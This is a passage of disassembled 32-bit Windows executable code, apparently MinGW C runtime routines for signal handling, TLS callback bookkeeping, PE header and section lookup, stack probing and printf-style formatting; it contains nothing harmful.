  403309:	jmp    eax
  40330b:	nop
  40330c:	lea    esi,[esi+eiz*1+0x0]
  403310:	mov    DWORD PTR [esp+0x4],0x0
  403318:	mov    DWORD PTR [esp],0x8
  40331f:	call   0x40ace0
  403324:	cmp    eax,0x1
  403327:	je     0x403400
  40332d:	test   eax,eax
  40332f:	je     0x4032f9
  403331:	mov    DWORD PTR [esp],0x8
  403338:	call   eax
  40333a:	mov    eax,0xffffffff
  40333f:	mov    ebx,DWORD PTR [ebp-0x4]
  403342:	leave  
  403343:	ret    0x4
  403346:	lea    esi,[esi+0x0]
  403349:	lea    edi,[edi+eiz*1+0x0]
  403350:	mov    DWORD PTR [esp+0x4],0x0
  403358:	mov    DWORD PTR [esp],0x8
  40335f:	call   0x40ace0
  403364:	cmp    eax,0x1
  403367:	jne    0x40332d
  403369:	mov    DWORD PTR [esp+0x4],0x1
  403371:	mov    DWORD PTR [esp],0x8
  403378:	call   0x40ace0
  40337d:	call   0x402cd0
  403382:	jmp    0x40333a
  403384:	cmp    eax,0xc000001d
  403389:	jne    0x4032f9
  40338f:	mov    DWORD PTR [esp+0x4],0x0
  403397:	mov    DWORD PTR [esp],0x4
  40339e:	call   0x40ace0
  4033a3:	cmp    eax,0x1
  4033a6:	je     0x4033c0
  4033a8:	test   eax,eax
  4033aa:	je     0x4032f9
  4033b0:	mov    DWORD PTR [esp],0x4
  4033b7:	call   eax
  4033b9:	jmp    0x40333a
  4033be:	xchg   ax,ax
  4033c0:	mov    DWORD PTR [esp+0x4],0x1
  4033c8:	mov    DWORD PTR [esp],0x4
  4033cf:	call   0x40ace0
  4033d4:	jmp    0x40333a
  4033d9:	lea    esi,[esi+eiz*1+0x0]
  4033e0:	mov    DWORD PTR [esp+0x4],0x1
  4033e8:	mov    DWORD PTR [esp],0xb
  4033ef:	call   0x40ace0
  4033f4:	jmp    0x40333a
  4033f9:	lea    esi,[esi+eiz*1+0x0]
  403400:	mov    DWORD PTR [esp+0x4],0x1
  403408:	mov    DWORD PTR [esp],0x8
  40340f:	call   0x40ace0
  403414:	jmp    0x40333a
  403419:	nop
  40341a:	nop
  40341b:	nop
  40341c:	nop
  40341d:	nop
  40341e:	nop
  40341f:	nop
  403420:	push   ebp
  403421:	push   edi
  403422:	push   esi
  403423:	push   ebx
  403424:	sub    esp,0x1c
  403427:	mov    DWORD PTR [esp],0x40f678
  40342e:	call   DWORD PTR ds:0x411284
  403434:	mov    ebx,DWORD PTR ds:0x40f670
  40343a:	sub    esp,0x4
  40343d:	mov    ebp,DWORD PTR ds:0x411300
  403443:	mov    edi,DWORD PTR ds:0x41129c
  403449:	test   ebx,ebx
  40344b:	je     0x403475
  40344d:	lea    esi,[esi+0x0]
  403450:	mov    eax,DWORD PTR [ebx]
  403452:	mov    DWORD PTR [esp],eax
  403455:	call   ebp
  403457:	sub    esp,0x4
  40345a:	mov    esi,eax
  40345c:	call   edi
  40345e:	test   eax,eax
  403460:	jne    0x40346e
  403462:	test   esi,esi
  403464:	je     0x40346e
  403466:	mov    eax,DWORD PTR [ebx+0x4]
  403469:	mov    DWORD PTR [esp],esi
  40346c:	call   eax
  40346e:	mov    ebx,DWORD PTR [ebx+0x8]
  403471:	test   ebx,ebx
  403473:	jne    0x403450
  403475:	mov    DWORD PTR [esp],0x40f678
  40347c:	call   DWORD PTR ds:0x4112d8
  403482:	sub    esp,0x4
  403485:	add    esp,0x1c
  403488:	pop    ebx
  403489:	pop    esi
  40348a:	pop    edi
  40348b:	pop    ebp
  40348c:	ret    
  40348d:	lea    esi,[esi+0x0]
  403490:	mov    eax,ds:0x40f674
  403495:	test   eax,eax
  403497:	jne    0x4034a0
  403499:	ret    
  40349a:	lea    esi,[esi+0x0]
  4034a0:	push   ebx
  4034a1:	sub    esp,0x18
  4034a4:	mov    DWORD PTR [esp+0x4],0xc
  4034ac:	mov    DWORD PTR [esp],0x1
  4034b3:	call   0x40ad48
  4034b8:	test   eax,eax
  4034ba:	mov    ebx,eax
  4034bc:	je     0x403500
  4034be:	mov    eax,DWORD PTR [esp+0x20]
  4034c2:	mov    DWORD PTR [esp],0x40f678
  4034c9:	mov    DWORD PTR [ebx],eax
  4034cb:	mov    eax,DWORD PTR [esp+0x24]
  4034cf:	mov    DWORD PTR [ebx+0x4],eax
  4034d2:	call   DWORD PTR ds:0x411284
  4034d8:	mov    eax,ds:0x40f670
  4034dd:	sub    esp,0x4
  4034e0:	mov    DWORD PTR ds:0x40f670,ebx
  4034e6:	mov    DWORD PTR [esp],0x40f678
  4034ed:	mov    DWORD PTR [ebx+0x8],eax
  4034f0:	call   DWORD PTR ds:0x4112d8
  4034f6:	xor    eax,eax
  4034f8:	sub    esp,0x4
  4034fb:	add    esp,0x18
  4034fe:	pop    ebx
  4034ff:	ret    
  403500:	mov    eax,0xffffffff
  403505:	jmp    0x4034fb
  403507:	mov    esi,esi
  403509:	lea    edi,[edi+eiz*1+0x0]
  403510:	push   ebx
  403511:	sub    esp,0x18
  403514:	mov    eax,ds:0x40f674
  403519:	mov    ebx,DWORD PTR [esp+0x20]
  40351d:	test   eax,eax
  40351f:	jne    0x403530
  403521:	add    esp,0x18
  403524:	xor    eax,eax
  403526:	pop    ebx
  403527:	ret    
  403528:	nop
  403529:	lea    esi,[esi+eiz*1+0x0]
  403530:	mov    DWORD PTR [esp],0x40f678
  403537:	call   DWORD PTR ds:0x411284
  40353d:	mov    edx,DWORD PTR ds:0x40f670
  403543:	sub    esp,0x4
  403546:	test   edx,edx
  403548:	je     0x403561
  40354a:	mov    eax,DWORD PTR [edx]
  40354c:	cmp    eax,ebx
  40354e:	jne    0x40355a
  403550:	jmp    0x4035a0
  403552:	mov    ecx,DWORD PTR [eax]
  403554:	cmp    ecx,ebx
  403556:	je     0x403580
  403558:	mov    edx,eax
  40355a:	mov    eax,DWORD PTR [edx+0x8]
  40355d:	test   eax,eax
  40355f:	jne    0x403552
  403561:	mov    DWORD PTR [esp],0x40f678
  403568:	call   DWORD PTR ds:0x4112d8
  40356e:	sub    esp,0x4
  403571:	add    esp,0x18
  403574:	xor    eax,eax
  403576:	pop    ebx
  403577:	ret    
  403578:	nop
  403579:	lea    esi,[esi+eiz*1+0x0]
  403580:	mov    ecx,DWORD PTR [eax+0x8]
  403583:	mov    DWORD PTR [edx+0x8],ecx
  403586:	mov    DWORD PTR [esp],eax
  403589:	call   0x40ad10
  40358e:	mov    DWORD PTR [esp],0x40f678
  403595:	call   DWORD PTR ds:0x4112d8
  40359b:	sub    esp,0x4
  40359e:	jmp    0x403571
  4035a0:	mov    eax,edx
  4035a2:	mov    edx,DWORD PTR [edx+0x8]
  4035a5:	mov    DWORD PTR ds:0x40f670,edx
  4035ab:	jmp    0x403586
  4035ad:	lea    esi,[esi+0x0]
  4035b0:	sub    esp,0x1c
  4035b3:	mov    eax,DWORD PTR [esp+0x24]
  4035b7:	cmp    eax,0x1
  4035ba:	je     0x403604
  4035bc:	jb     0x4035d5
  4035be:	cmp    eax,0x3
  4035c1:	jne    0x4035cc
  4035c3:	mov    eax,ds:0x40f674
  4035c8:	test   eax,eax
  4035ca:	jne    0x403632
  4035cc:	mov    eax,0x1
  4035d1:	add    esp,0x1c
  4035d4:	ret    
  4035d5:	mov    eax,ds:0x40f674
  4035da:	test   eax,eax
  4035dc:	jne    0x403640
  4035de:	mov    eax,ds:0x40f674
  4035e3:	cmp    eax,0x1
  4035e6:	jne    0x4035cc
  4035e8:	mov    DWORD PTR ds:0x40f674,0x0
  4035f2:	mov    DWORD PTR [esp],0x40f678
  4035f9:	call   DWORD PTR ds:0x411280
  4035ff:	sub    esp,0x4
  403602:	jmp    0x4035cc
  403604:	mov    eax,ds:0x40f674
  403609:	test   eax,eax
  40360b:	je     0x403620
  40360d:	mov    DWORD PTR ds:0x40f674,0x1
  403617:	mov    eax,0x1
  40361c:	add    esp,0x1c
  40361f:	ret    
  403620:	mov    DWORD PTR [esp],0x40f678
  403627:	call   DWORD PTR ds:0x4112c8
  40362d:	sub    esp,0x4
  403630:	jmp    0x40360d
  403632:	call   0x403420
  403637:	jmp    0x4035cc
  403639:	lea    esi,[esi+eiz*1+0x0]
  403640:	call   0x403420
  403645:	jmp    0x4035de
  403647:	nop
  403648:	nop
  403649:	nop
  40364a:	nop
  40364b:	nop
  40364c:	nop
  40364d:	nop
  40364e:	nop
  40364f:	nop
  403650:	add    eax,DWORD PTR [eax+0x3c]
  403653:	cmp    DWORD PTR [eax],0x4550
  403659:	je     0x403660
  40365b:	xor    eax,eax
  40365d:	ret    
  40365e:	xchg   ax,ax
  403660:	cmp    WORD PTR [eax+0x18],0x10b
  403666:	sete   al
  403669:	movzx  eax,al
  40366c:	ret    
  40366d:	lea    esi,[esi+0x0]
  403670:	mov    eax,DWORD PTR [esp+0x4]
  403674:	cmp    WORD PTR [eax],0x5a4d
  403679:	je     0x403680
  40367b:	xor    eax,eax
  40367d:	ret    
  40367e:	xchg   ax,ax
  403680:	jmp    0x403650
  403682:	lea    esi,[esi+eiz*1+0x0]
  403689:	lea    edi,[edi+eiz*1+0x0]
  403690:	push   esi
  403691:	push   ebx
  403692:	mov    edx,DWORD PTR [esp+0xc]
  403696:	mov    ebx,DWORD PTR [esp+0x10]
  40369a:	add    edx,DWORD PTR [edx+0x3c]
  40369d:	movzx  esi,WORD PTR [edx+0x6]
  4036a1:	movzx  eax,WORD PTR [edx+0x14]
  4036a5:	test   esi,esi
  4036a7:	lea    eax,[edx+eax*1+0x18]
  4036ab:	je     0x4036c8
  4036ad:	xor    ecx,ecx
  4036af:	nop
  4036b0:	mov    edx,DWORD PTR [eax+0xc]
  4036b3:	cmp    edx,ebx
  4036b5:	ja     0x4036be
  4036b7:	add    edx,DWORD PTR [eax+0x8]
  4036ba:	cmp    ebx,edx
  4036bc:	jb     0x4036ca
  4036be:	add    ecx,0x1
  4036c1:	add    eax,0x28
  4036c4:	cmp    ecx,esi
  4036c6:	jne    0x4036b0
  4036c8:	xor    eax,eax
  4036ca:	pop    ebx
  4036cb:	pop    esi
  4036cc:	ret    
  4036cd:	lea    esi,[esi+0x0]
  4036d0:	push   ebp
  4036d1:	push   edi
  4036d2:	push   esi
  4036d3:	push   ebx
  4036d4:	xor    esi,esi
  4036d6:	sub    esp,0x1c
  4036d9:	mov    edi,DWORD PTR [esp+0x30]
  4036dd:	mov    DWORD PTR [esp],edi
  4036e0:	call   0x40acd0
  4036e5:	cmp    eax,0x8
  4036e8:	ja     0x4036f5
  4036ea:	cmp    WORD PTR ds:0x400000,0x5a4d
  4036f3:	je     0x403700
  4036f5:	add    esp,0x1c
  4036f8:	mov    eax,esi
  4036fa:	pop    ebx
  4036fb:	pop    esi
  4036fc:	pop    edi
  4036fd:	pop    ebp
  4036fe:	ret    
  4036ff:	nop
  403700:	mov    eax,0x400000
  403705:	call   0x403650
  40370a:	test   eax,eax
  40370c:	je     0x4036f5
  40370e:	mov    eax,ds:0x40003c
  403713:	lea    edx,[eax+0x400000]
  403719:	movzx  eax,WORD PTR [eax+0x400014]
  403720:	movzx  ebp,WORD PTR [edx+0x6]
  403724:	lea    ebx,[edx+eax*1+0x18]
  403728:	test   ebp,ebp
  40372a:	jne    0x40373a
  40372c:	jmp    0x4036f5
  40372e:	xchg   ax,ax
  403730:	add    esi,0x1
  403733:	add    ebx,0x28
  403736:	cmp    esi,ebp
  403738:	je     0x403760
  40373a:	mov    DWORD PTR [esp+0x8],0x8
  403742:	mov    DWORD PTR [esp+0x4],edi
  403746:	mov    DWORD PTR [esp],ebx
  403749:	call   0x40acc8
  40374e:	test   eax,eax
  403750:	jne    0x403730
  403752:	add    esp,0x1c
  403755:	mov    esi,ebx
  403757:	mov    eax,esi
  403759:	pop    ebx
  40375a:	pop    esi
  40375b:	pop    edi
  40375c:	pop    ebp
  40375d:	ret    
  40375e:	xchg   ax,ax
  403760:	add    esp,0x1c
  403763:	xor    esi,esi
  403765:	pop    ebx
  403766:	mov    eax,esi
  403768:	pop    esi
  403769:	pop    edi
  40376a:	pop    ebp
  40376b:	ret    
  40376c:	lea    esi,[esi+eiz*1+0x0]
  403770:	push   ebx
  403771:	xor    ebx,ebx
  403773:	sub    esp,0x8
  403776:	cmp    WORD PTR ds:0x400000,0x5a4d
  40377f:	je     0x403790
  403781:	add    esp,0x8
  403784:	mov    eax,ebx
  403786:	pop    ebx
  403787:	ret    
  403788:	nop
  403789:	lea    esi,[esi+eiz*1+0x0]
  403790:	mov    eax,0x400000
  403795:	call   0x403650
  40379a:	test   eax,eax
  40379c:	je     0x403781
  40379e:	mov    eax,DWORD PTR [esp+0x10]
  4037a2:	mov    DWORD PTR [esp],0x400000
  4037a9:	sub    eax,0x400000
  4037ae:	mov    DWORD PTR [esp+0x4],eax
  4037b2:	call   0x403690
  4037b7:	add    esp,0x8
  4037ba:	mov    ebx,eax
  4037bc:	mov    eax,ebx
  4037be:	pop    ebx
  4037bf:	ret    
  4037c0:	xor    eax,eax
  4037c2:	cmp    WORD PTR ds:0x400000,0x5a4d
  4037cb:	je     0x4037d0
  4037cd:	repz ret 
  4037cf:	nop
  4037d0:	mov    eax,0x400000
  4037d5:	call   0x403650
  4037da:	test   eax,eax
  4037dc:	je     0x4037cd
  4037de:	mov    eax,ds:0x40003c
  4037e3:	movzx  eax,WORD PTR [eax+0x400006]
  4037ea:	ret    
  4037eb:	nop
  4037ec:	lea    esi,[esi+eiz*1+0x0]
  4037f0:	push   esi
  4037f1:	xor    esi,esi
  4037f3:	cmp    WORD PTR ds:0x400000,0x5a4d
  4037fc:	push   ebx
  4037fd:	mov    ebx,DWORD PTR [esp+0xc]
  403801:	je     0x403810
  403803:	mov    eax,esi
  403805:	pop    ebx
  403806:	pop    esi
  403807:	ret    
  403808:	nop
  403809:	lea    esi,[esi+eiz*1+0x0]
  403810:	mov    eax,0x400000
  403815:	call   0x403650
  40381a:	test   eax,eax
  40381c:	je     0x403803
  40381e:	mov    eax,ds:0x40003c
  403823:	lea    ecx,[eax+0x400000]
  403829:	movzx  eax,WORD PTR [eax+0x400014]
  403830:	lea    edx,[ecx+eax*1+0x18]
  403834:	movzx  ecx,WORD PTR [ecx+0x6]
  403838:	test   ecx,ecx
  40383a:	je     0x403803
  40383c:	xor    eax,eax
  40383e:	xchg   ax,ax
  403840:	test   BYTE PTR [edx+0x27],0x20
  403844:	je     0x40384d
  403846:	test   ebx,ebx
  403848:	je     0x403860
  40384a:	sub    ebx,0x1
  40384d:	add    eax,0x1
  403850:	add    edx,0x28
  403853:	cmp    eax,ecx
  403855:	jne    0x403840
  403857:	xor    esi,esi
  403859:	mov    eax,esi
  40385b:	pop    ebx
  40385c:	pop    esi
  40385d:	ret    
  40385e:	xchg   ax,ax
  403860:	mov    esi,edx
  403862:	mov    eax,esi
  403864:	pop    ebx
  403865:	pop    esi
  403866:	ret    
  403867:	mov    esi,esi
  403869:	lea    edi,[edi+eiz*1+0x0]
  403870:	push   ebx
  403871:	xor    ebx,ebx
  403873:	cmp    WORD PTR ds:0x400000,0x5a4d
  40387c:	je     0x403882
  40387e:	mov    eax,ebx
  403880:	pop    ebx
  403881:	ret    
  403882:	mov    eax,0x400000
  403887:	call   0x403650
  40388c:	test   eax,eax
  40388e:	mov    eax,0x400000
  403893:	cmovne ebx,eax
  403896:	mov    eax,ebx
  403898:	pop    ebx
  403899:	ret    
  40389a:	lea    esi,[esi+0x0]
  4038a0:	xor    eax,eax
  4038a2:	cmp    WORD PTR ds:0x400000,0x5a4d
  4038ab:	je     0x4038b0
  4038ad:	ret    
  4038ae:	xchg   ax,ax
  4038b0:	sub    esp,0x8
  4038b3:	mov    eax,0x400000
  4038b8:	call   0x403650
  4038bd:	test   eax,eax
  4038bf:	je     0x4038e6
  4038c1:	mov    eax,DWORD PTR [esp+0xc]
  4038c5:	mov    DWORD PTR [esp],0x400000
  4038cc:	sub    eax,0x400000
  4038d1:	mov    DWORD PTR [esp+0x4],eax
  4038d5:	call   0x403690
  4038da:	test   eax,eax
  4038dc:	je     0x4038f0
  4038de:	mov    eax,DWORD PTR [eax+0x24]
  4038e1:	not    eax
  4038e3:	shr    eax,0x1f
  4038e6:	add    esp,0x8
  4038e9:	ret    
  4038ea:	lea    esi,[esi+0x0]
  4038f0:	xor    eax,eax
  4038f2:	jmp    0x4038e6
  4038f4:	lea    esi,[esi+0x0]
  4038fa:	lea    edi,[edi+0x0]
  403900:	push   edi
  403901:	push   esi
  403902:	xor    edi,edi
  403904:	push   ebx
  403905:	sub    esp,0x8
  403908:	cmp    WORD PTR ds:0x400000,0x5a4d
  403911:	mov    esi,DWORD PTR [esp+0x18]
  403915:	je     0x403920
  403917:	add    esp,0x8
  40391a:	mov    eax,edi
  40391c:	pop    ebx
  40391d:	pop    esi
  40391e:	pop    edi
  40391f:	ret    
  403920:	mov    eax,0x400000
  403925:	call   0x403650
  40392a:	test   eax,eax
  40392c:	je     0x403917
  40392e:	mov    eax,ds:0x40003c
  403933:	mov    ebx,DWORD PTR [eax+0x400080]
  403939:	test   ebx,ebx
  40393b:	je     0x403917
  40393d:	mov    DWORD PTR [esp+0x4],ebx
  403941:	mov    DWORD PTR [esp],0x400000
  403948:	call   0x403690
  40394d:	test   eax,eax
  40394f:	je     0x403917
  403951:	add    ebx,0x400000
  403957:	mov    edx,ebx
  403959:	jne    0x403966
  40395b:	jmp    0x403917
  40395d:	lea    esi,[esi+0x0]
  403960:	sub    esi,0x1
  403963:	add    edx,0x14
  403966:	mov    ecx,DWORD PTR [edx+0x4]
  403969:	test   ecx,ecx
  40396b:	jne    0x403974
  40396d:	mov    eax,DWORD PTR [edx+0xc]
  403970:	test   eax,eax
  403972:	je     0x403990
  403974:	test   esi,esi
  403976:	jg     0x403960
  403978:	mov    edi,DWORD PTR [edx+0xc]
  40397b:	add    esp,0x8
  40397e:	pop    ebx
  40397f:	pop    esi
  403980:	add    edi,0x400000
  403986:	mov    eax,edi
  403988:	pop    edi
  403989:	ret    
  40398a:	lea    esi,[esi+0x0]
  403990:	add    esp,0x8
  403993:	xor    edi,edi
  403995:	mov    eax,edi
  403997:	pop    ebx
  403998:	pop    esi
  403999:	pop    edi
  40399a:	ret    
  40399b:	nop
  40399c:	nop
  40399d:	nop
  40399e:	nop
  40399f:	nop
  4039a0:	push   ecx
  4039a1:	push   eax
  4039a2:	cmp    eax,0x1000
  4039a7:	lea    ecx,[esp+0xc]
  4039ab:	jb     0x4039c2
  4039ad:	sub    ecx,0x1000
  4039b3:	or     DWORD PTR [ecx],0x0
  4039b6:	sub    eax,0x1000
  4039bb:	cmp    eax,0x1000
  4039c0:	ja     0x4039ad
  4039c2:	sub    ecx,eax
  4039c4:	or     DWORD PTR [ecx],0x0
  4039c7:	pop    eax
  4039c8:	pop    ecx
  4039c9:	ret    
  4039ca:	nop
  4039cb:	nop
  4039cc:	xchg   ax,ax
  4039ce:	xchg   ax,ax
  4039d0:	sub    esp,0x2c
  4039d3:	mov    eax,DWORD PTR [esp+0x38]
  4039d7:	mov    DWORD PTR [esp+0x8],0x0
  4039df:	mov    DWORD PTR [esp],0x6000
  4039e6:	mov    DWORD PTR [esp+0x10],eax
  4039ea:	mov    eax,DWORD PTR [esp+0x34]
  4039ee:	mov    DWORD PTR [esp+0xc],eax
  4039f2:	mov    eax,DWORD PTR [esp+0x30]
  4039f6:	mov    DWORD PTR [esp+0x4],eax
  4039fa:	call   0x405340
  4039ff:	add    esp,0x2c
  403a02:	ret    
  403a03:	nop
  403a04:	nop
  403a05:	nop
  403a06:	nop
  403a07:	nop
  403a08:	nop
  403a09:	nop
  403a0a:	nop
  403a0b:	nop
  403a0c:	nop
  403a0d:	nop
  403a0e:	nop
  403a0f:	nop
  403a10:	sub    esp,0x2c
  403a13:	mov    eax,DWORD PTR [esp+0x38]
  403a17:	mov    DWORD PTR [esp+0x8],0x0
  403a1f:	mov    DWORD PTR [esp],0x6000
  403a26:	mov    DWORD PTR [esp+0x10],eax
  403a2a:	mov    eax,DWORD PTR [esp+0x34]
  403a2e:	mov    DWORD PTR [esp+0xc],eax
  403a32:	mov    eax,DWORD PTR [esp+0x30]
  403a36:	mov    DWORD PTR [esp+0x4],eax
  403a3a:	call   0x4076a0
  403a3f:	add    esp,0x2c
  403a42:	ret    
  403a43:	nop
  403a44:	nop
  403a45:	nop
  403a46:	nop
  403a47:	nop
  403a48:	nop
  403a49:	nop
  403a4a:	nop
  403a4b:	nop
  403a4c:	nop
  403a4d:	nop
  403a4e:	nop
  403a4f:	nop
  403a50:	push   esi
  403a51:	push   ebx
  403a52:	sub    esp,0x24
  403a55:	mov    eax,DWORD PTR [esp+0x34]
  403a59:	mov    esi,DWORD PTR [esp+0x30]
  403a5d:	mov    edx,DWORD PTR [esp+0x38]
  403a61:	mov    ecx,DWORD PTR [esp+0x3c]
  403a65:	test   eax,eax
  403a67:	je     0x403aa0
  403a69:	lea    ebx,[eax-0x1]
  403a6c:	mov    DWORD PTR [esp+0x4],esi
  403a70:	mov    DWORD PTR [esp+0x10],ecx
  403a74:	mov    DWORD PTR [esp+0xc],edx
  403a78:	mov    DWORD PTR [esp],0x0
  403a7f:	mov    DWORD PTR [esp+0x8],ebx
  403a83:	call   0x405340
  403a88:	cmp    eax,ebx
  403a8a:	cmovle ebx,eax
  403a8d:	mov    BYTE PTR [esi+ebx*1],0x0
  403a91:	add    esp,0x24
  403a94:	pop    ebx
  403a95:	pop    esi
  403a96:	ret    
  403a97:	mov    esi,esi
  403a99:	lea    edi,[edi+eiz*1+0x0]
  403aa0:	mov    DWORD PTR [esp+0x4],esi
  403aa4:	mov    DWORD PTR [esp+0x10],ecx
  403aa8:	mov    DWORD PTR [esp+0xc],edx
  403aac:	mov    DWORD PTR [esp+0x8],0x0
  403ab4:	mov    DWORD PTR [esp],0x0
  403abb:	call   0x405340
  403ac0:	add    esp,0x24
  403ac3:	pop    ebx
  403ac4:	pop    esi
  403ac5:	ret    
  403ac6:	nop
  403ac7:	nop
  403ac8:	nop
  403ac9:	nop
  403aca:	nop
  403acb:	nop
  403acc:	nop
  403acd:	nop
  403ace:	nop
  403acf:	nop
  403ad0:	push   ebx
  403ad1:	mov    ebx,eax
  403ad3:	sub    esp,0x48
  403ad6:	mov    eax,DWORD PTR [esp+0x50]
  403ada:	mov    DWORD PTR [esp+0x20],eax
  403ade:	mov    eax,DWORD PTR [esp+0x54]
  403ae2:	mov    DWORD PTR [esp+0x24],eax
  403ae6:	mov    eax,DWORD PTR [esp+0x58]
  403aea:	mov    DWORD PTR [esp+0x28],eax
  403aee:	mov    eax,DWORD PTR [esp+0x5c]
  403af2:	fld    TBYTE PTR [esp+0x20]
  403af6:	mov    DWORD PTR [esp+0x2c],eax
  403afa:	fxam   
  403afc:	fstsw  ax
  403aff:	fstp   st(0)
  403b01:	test   ah,0x1
  403b04:	je     0x403b20
  403b06:	test   ah,0x4
  403b09:	je     0x403ba0
  403b0f:	mov    DWORD PTR [esp+0x38],0x3
  403b17:	movzx  edx,WORD PTR [esp+0x28]
  403b1c:	xor    ecx,ecx
  403b1e:	jmp    0x403b34
  403b20:	test   ah,0x4
  403b23:	jne    0x403b81
  403b25:	movzx  edx,WORD PTR [esp+0x28]
  403b2a:	mov    DWORD PTR [esp+0x38],0x0
  403b32:	xor    ecx,ecx
  403b34:	and    edx,0x8000
  403b3a:	mov    eax,DWORD PTR [esp+0x68]
  403b3e:	mov    DWORD PTR [eax],edx
  403b40:	lea    eax,[esp+0x3c]
  403b44:	mov    DWORD PTR [esp+0x10],ebx
  403b48:	mov    DWORD PTR [esp+0x4],ecx
  403b4c:	mov    DWORD PTR [esp],0x40c01c
  403b53:	mov    DWORD PTR [esp+0x1c],eax
  403b57:	mov    eax,DWORD PTR [esp+0x64]
  403b5b:	mov    DWORD PTR [esp+0x18],eax
  403b5f:	mov    eax,DWORD PTR [esp+0x60]
  403b63:	mov    DWORD PTR [esp+0x14],eax
  403b67:	lea    eax,[esp+0x38]
  403b6b:	mov    DWORD PTR [esp+0xc],eax
  403b6f:	lea    eax,[esp+0x20]
  403b73:	mov    DWORD PTR [esp+0x8],eax
  403b77:	call   0x408460
  403b7c:	add    esp,0x48
  403b7f:	pop    ebx
  403b80:	ret    
  403b81:	test   ah,0x40
  403b84:	je     0x403bb0
  403b86:	mov    DWORD PTR [esp+0x38],0x2
  403b8e:	movzx  edx,WORD PTR [esp+0x28]
  403b93:	mov    ecx,0xffffbfc3
  403b98:	jmp    0x403b34
  403b9a:	lea    esi,[esi+0x0]
  403ba0:	mov    DWORD PTR [esp+0x38],0x4
  403ba8:	xor    ecx,ecx
  403baa:	xor    edx,edx
  403bac:	jmp    0x403b3a
  403bae:	xchg   ax,ax
  403bb0:	movzx  edx,WORD PTR [esp+0x28]
  403bb5:	mov    DWORD PTR [esp+0x38],0x1
  403bbd:	mov    ecx,edx
  403bbf:	and    ecx,0x7fff
  403bc5:	sub    ecx,0x403e
  403bcb:	jmp    0x403b34
  403bd0:	push   ebx
  403bd1:	sub    esp,0x28
  403bd4:	mov    ebx,DWORD PTR [edx+0x4]
  403bd7:	test   bh,0x40
  403bda:	jne    0x403be4
  403bdc:	mov    ecx,DWORD PTR [edx+0x20]
  403bdf:	cmp    DWORD PTR [edx+0x24],ecx
  403be2:	jle    0x403bf4
  403be4:	and    bh,0x20
  403be7:	jne    0x403c00
  403be9:	mov    ecx,DWORD PTR [edx+0x20]
  403bec:	mov    ebx,DWORD PTR [edx]
  403bee:	mov    BYTE PTR [ebx+ecx*1],al
  403bf1:	mov    ecx,DWORD PTR [edx+0x20]
  403bf4:	add    ecx,0x1
  403bf7:	mov    DWORD PTR [edx+0x20],ecx
  403bfa:	add    esp,0x28
  403bfd:	pop    ebx
  403bfe:	ret    
  403bff:	nop
  403c00:	mov    ecx,DWORD PTR [edx]
  403c02:	mov    DWORD PTR [esp],eax
  403c05:	mov    DWORD PTR [esp+0x1c],edx
  403c09:	mov    DWORD PTR [esp+0x4],ecx
  403c0d:	call   0x40ad20
  403c12:	mov    edx,DWORD PTR [esp+0x1c]
  403c16:	mov    ecx,DWORD PTR [edx+0x20]
  403c19:	add    ecx,0x1
  403c1c:	mov    DWORD PTR [edx+0x20],ecx
  403c1f:	add    esp,0x28
  403c22:	pop    ebx
  403c23:	ret    
  403c24:	lea    esi,[esi+0x0]
  403c2a:	lea    edi,[edi+0x0]
  403c30:	push   ebp
  403c31:	push   edi
  403c32:	push   esi
  403c33:	push   ebx
  403c34:	mov    ebx,ecx
  403c36:	sub    esp,0x4c
  403c39:	mov    DWORD PTR [esp+0x18],eax
  403c3d:	lea    ebp,[esp+0x30]
  403c41:	lea    eax,[esp+0x2c]
  403c45:	mov    DWORD PTR [esp+0x4],0x0
  403c4d:	mov    DWORD PTR [esp+0x1c],edx
  403c51:	mov    DWORD PTR [esp+0x8],eax
  403c55:	mov    DWORD PTR [esp],ebp
  403c58:	call   0x40ab00
  403c5d:	mov    esi,DWORD PTR [ebx+0xc]
  403c60:	mov    edx,DWORD PTR [esp+0x1c]
  403c64:	cmp    esi,edx
  403c66:	jge    0x403d11
  403c6c:	test   esi,esi
  403c6e:	js     0x403d11
  403c74:	mov    eax,DWORD PTR [ebx+0x8]
  403c77:	cmp    esi,eax
  403c79:	jge    0x403d1e
  403c7f:	sub    eax,esi
  403c81:	test   eax,eax
  403c83:	mov    DWORD PTR [ebx+0x8],eax
  403c86:	jle    0x403c92
  403c88:	test   BYTE PTR [ebx+0x5],0x4
  403c8c:	je     0x403d2a
  403c92:	mov    DWORD PTR [esp+0x1c],esi
  403c96:	lea    esi,[esi+0x0]
  403c99:	lea    edi,[edi+eiz*1+0x0]
  403ca0:	mov    eax,DWORD PTR [esp+0x1c]
  403ca4:	test   eax,eax
  403ca6:	jle    0x403cfc
  403ca8:	add    DWORD PTR [esp+0x18],0x2
  403cad:	lea    ecx,[esp+0x2c]
  403cb1:	mov    eax,DWORD PTR [esp+0x18]
  403cb5:	mov    DWORD PTR [esp+0x8],ecx
  403cb9:	movzx  eax,WORD PTR [eax-0x2]
  403cbd:	mov    DWORD PTR [esp],ebp
  403cc0:	mov    DWORD PTR [esp+0x4],eax
  403cc4:	call   0x40ab00
  403cc9:	test   eax,eax
  403ccb:	jle    0x403cfc
  403ccd:	lea    esi,[ebp+eax*1+0x0]
  403cd1:	mov    edi,ebp
  403cd3:	add    edi,0x1
  403cd6:	movsx  eax,BYTE PTR [edi-0x1]
  403cda:	mov    edx,ebx
  403cdc:	call   0x403bd0
  403ce1:	cmp    edi,esi
  403ce3:	jne    0x403cd3
  403ce5:	sub    DWORD PTR [esp+0x1c],0x1
  403cea:	jmp    0x403ca0
  403cec:	lea    esi,[esi+eiz*1+0x0]
  403cf0:	mov    edx,ebx
  403cf2:	mov    eax,0x20
  403cf7:	call   0x403bd0
  403cfc:	mov    eax,DWORD PTR [ebx+0x8]
  403cff:	lea    edx,[eax-0x1]
  403d02:	test   eax,eax
  403d04:	mov    DWORD PTR [ebx+0x8],edx
  403d07:	jg     0x403cf0
  403d09:	add    esp,0x4c
  403d0c:	pop    ebx
  403d0d:	pop    esi
  403d0e:	pop    edi
  403d0f:	pop    ebp
  403d10:	ret    
  403d11:	mov    eax,DWORD PTR [ebx+0x8]
  403d14:	mov    esi,edx
  403d16:	cmp    esi,eax
  403d18:	jl     0x403c7f
  403d1e:	mov    DWORD PTR [ebx+0x8],0xffffffff
  403d25:	jmp    0x403c92
  403d2a:	sub    eax,0x1
  403d2d:	mov    DWORD PTR [ebx+0x8],eax
  403d30:	mov    edx,ebx
  403d32:	mov    eax,0x20
  403d37:	call   0x403bd0
  403d3c:	mov    eax,DWORD PTR [ebx+0x8]
  403d3f:	lea    edx,[eax-0x1]
  403d42:	test   eax,eax
